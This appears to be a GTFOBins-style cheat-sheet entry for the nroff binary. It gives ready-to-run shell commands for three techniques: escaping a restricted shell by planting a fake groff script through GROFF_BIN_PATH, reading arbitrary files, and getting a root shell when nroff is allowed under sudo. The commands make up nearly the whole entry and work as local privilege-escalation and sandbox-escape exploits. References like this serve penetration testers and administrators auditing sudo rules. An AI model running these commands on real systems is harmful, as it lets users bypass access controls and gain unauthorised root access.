# GTFOBin: nroff

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file is typeset and some warning messages may appear.

```
LFILE=file_to_read
nroff $LFILE
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
sudo GROFF_BIN_PATH=$TF nroff
```